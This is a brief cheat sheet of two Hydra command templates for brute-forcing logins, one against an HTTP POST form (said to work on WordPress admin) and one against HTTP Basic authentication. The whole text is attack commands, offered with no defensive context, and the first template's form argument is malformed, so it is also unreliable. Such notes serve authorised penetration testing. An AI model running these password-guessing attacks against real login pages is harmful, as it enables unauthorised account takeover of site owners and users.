
Hydra http-post form brute force
Works on WP Admin
```
hydra -l <username> -P <password_list> <ip_address> http-post-form "/<path_to_form>/<username_and_password_response>"
```


Hydra Brute Force Attack Basic Authentication
```
`hydra -l username -P password_file.txt -s port -f ip_address request_method /path`
```